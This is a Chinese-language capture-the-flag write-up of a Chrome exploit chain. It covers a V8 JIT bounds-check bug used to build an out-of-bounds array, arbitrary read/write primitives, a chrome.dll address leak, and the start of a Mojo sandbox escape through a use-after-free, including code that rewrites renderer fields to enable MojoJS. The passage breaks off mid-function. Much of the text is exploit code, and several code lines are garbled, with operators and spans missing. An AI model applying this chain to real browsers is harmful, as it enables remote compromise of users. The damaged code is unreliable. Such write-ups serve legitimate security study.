      var i = x - y;
      return i;
    }
    for (var i=0;ipoisoning_level_ ==
    -                  PoisoningMitigationLevel::kDontPoison &&
    -              (index_type.IsNone() || length_type.IsNone() ||
    +          if ((index_type.IsNone() || length_type.IsNone() ||
                    (index_type.Min() >= 0.0 &&
                     index_type.Max() InputAt(0));
此处patch的作用是在一些情况下将`checkbounds`节点消除，由于高版本V8已经不会将`checkbounds`节点直接消除，因此出题者为了降低难度增加了这个patch。构造OOB的数组过程如下，其过程比较简单
    var length_as_double = p64f(0x08042a89,0x200000);
    function opt(b) {
      //Range(-1,-0)
      var x = b ? -1 : -0;
      //Range(-1,-0x80000000)
      var y = b ? 1 : -0x80000000;
      //Range(-1,0)
      var i = ((x - y) == -0x80000000);
      if (b) i = -1;
      //将i转换为数字，否则会进行Deoptimization
      //Range(-1,0)
      //reality:1
      i = i >> 0;
      //Range(0,1)
      //reality:2
      i = i + 1;
      //Range(0,2)
      //reality:4
      i = i * 2;
      //Range(1,3)
      //reality:5
      i = i + 1
      var arr = [1.1,2.2,3.3,4.4,5.5];
      var oob = [1.1,2.2];
      arr[i] = length_as_double;
      return oob;
    }
    for(let i = 0; i > 32n),0);
       return adv.getBigUint64(0,true);
    }
    function write64(addr,value) {
       oob[0x22] = p64f(0,big2int(addr));
       oob[0x23] = p64f(big2int(addr >> 32n),0);
       adv.setBigUint64(0,value,true);
    }
###  地址泄露
我们使用`addressOf`泄露出`chrome.dll`的地址，然后后续就可以计算出一些gadgets的地址
    var window_addr = addressOf(window);
    chrome_dll_base = read64(window_addr+0x10n) - 0x7e86298n;
    console.log("chrome_dll_base=0x" + chrome_dll_base.toString(16));
## 0x03 沙箱逃逸Mojo部分
###  漏洞分析
    +void RenderFrameHostImpl::CreateAntNest(
    +    mojo::PendingReceiver receiver) {
    +  mojo::MakeSelfOwnedReceiver(std::make_unique(this),
    +                                std::move(receiver));
    +}
在`CreateAntNest`创建实例时，使用`std::make_unique(this)`，创建了一个`AntNestImpl`对象，并使用`unique`智能指针进行管理，那么意味着这个`AntNestImpl`对象的生命周期与通信管道绑定了，在js层，我们可以通过`xxx.ptr.reset()`来手动释放。`this指针`也就是`RenderFrameHostImpl`对象的指针被保存于`AntNestImpl`对象中
    +AntNestImpl::AntNestImpl(
    +        RenderFrameHost* render_frame_host)
    +        : render_frame_host_(render_frame_host){}
并且在`AntNestImpl::Store`和`AntNestImpl::Fetch`函数中，有调用`render_frame_host_`中的虚表函数
    +void AntNestImpl::Store(const std::string &data){
    +    size_t depth = render_frame_host_->GetFrameDepth();
    +    if(depth == 0 || depth > 10){
    +        return;
    +    }
    +    size_t capacity = depth * 0x100;
    +    size_t count = capacity GetFrameDepth();
    +    if(depth == 0 || depth > 10){
    +        std::move(callback).Run("error depth");
    +        return;
    +    }
    +    auto it = container_.find(depth);
    +    if(it == container_.end()){
    +        std::move(callback).Run("not yet stored");
    +        return;
    +    }
    +
    +    std::move(callback).Run(it->second);
    +}
然而该对象不会随着`render_frame_host_`对象的销毁而销毁，这意味着即使`render_frame_host_`被释放了,其指针仍然在`AntNestImpl`对象中，我们仍然可以对其相关函数进行调用，这就造成了UAF。
###  开启Mojo功能
正常情况下，`chrome`启动时是没有开启`Mojo`支持的，除非启动时加上选项`--enable-blink-features=MojoJS`，开启`Mojo`的判断逻辑如下
    void RenderFrameImpl::DidCreateScriptContext(v8::Local context,
                                                 int world_id) {
      if (((enabled_bindings_ & BINDINGS_POLICY_MOJO_WEB_UI) ||
           enable_mojo_js_bindings_) &&
          IsMainFrame() && world_id == ISOLATED_WORLD_ID_GLOBAL) {
        // We only allow these bindings to be installed when creating the main
        // world context of the main frame.
        blink::WebContextFeatures::EnableMojoJS(context, true);
      }
从中可以看出，只有`main frame`才可以支持`Mojo`，判断`main
frame`是通过`IsMainFrame`函数来判断，实质就是`frame`对象中的一个字段，可以用任意地址读写将其修改为`1`，即可满足这一个条件，然而第二个条件就是`enable_mojo_js_bindings_`为真或者`enabled_bindings_`为`BINDINGS_POLICY_MOJO_WEB_UI`，即`2`，由于我们在V8方面已经可以任意地址读写，只需修改相关`RenderFrameImpl`对象中的一些字段，然后在js层使用`window.location.reload();`重新加载页面，即可开启Mojo。一个网页中可能会用多个`RenderFrameImpl`对象，我们可以使用如下方法在一个网页中添加一个`iframe`，其对应着`RenderFrameImpl`对象。
          var iframe = document.createElement("iframe");
          iframe.src = "child.html";
          document.body.appendChild(iframe);
其中`child.html`内容如下
            if (checkMojo())  {
               antNestPtr = new antctf.mojom.AntNestPtr();
               Mojo.bindInterface(antctf.mojom.AntNest.name,
                    mojo.makeRequest(antNestPtr).handle, "context", true);
               antNestPtr.store("aaaabbbb");
            } else {
               enable_mojo();
               window.location.reload();
            }
这些`RenderFrameImpl`对象，通过`g_frame_map`存储，这是一个全局变量，其定义如下
    typedef std::map FrameMap;
    base::LazyInstance::DestructorAtExit g_frame_map =
        LAZY_INSTANCE_INITIALIZER;
可以大致知道它是一个`std::map`容器，由于题目给我们的`chrome.dll`是去掉符号的，但幸运的是保留了一些调试信息，因此可以根据一些调试信息来定位`g_frame_map`的位置，不然就得重新编译一份版本一样的进行比对。可以通过IDA过滤字符串`render_frame_impl.cc`，然后定位到该字符串，交叉引用，列出一些函数，然后查看函数，找到一些特征，然后再加以动态调试观察
可以确定`7FF87C478E80`这个位置就是`g_frame_map`，其偏移为`0x8688e80`，于是，我们可以遍历`g_frame_map`，修改每一个`RenderFrameImpl`对象里的信息，使其满足开启`Mojo`的条件
    function enable_mojo() {
       var g_frame_map_addr = chrome_dll_base + 0x8688e80n;
       console.log("g_frame_map_addr=0x" + g_frame_map_addr.toString(16));
       var begin_ptr = read64(g_frame_map_addr + 0x8n);